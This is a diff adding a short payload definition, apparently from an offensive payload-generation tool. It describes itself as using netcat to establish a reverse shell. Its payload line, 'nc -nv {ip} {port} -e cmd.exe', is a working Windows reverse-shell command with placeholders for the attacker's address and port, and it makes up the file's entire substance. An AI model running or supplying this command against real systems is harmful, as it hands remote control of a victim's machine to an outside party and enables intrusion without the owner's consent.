@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Uses netcat tool to establish a reverse shell
+
+[Payload]
+Type     = Reverser
+Payload  = nc -nv {ip} {port} -e cmd.exe
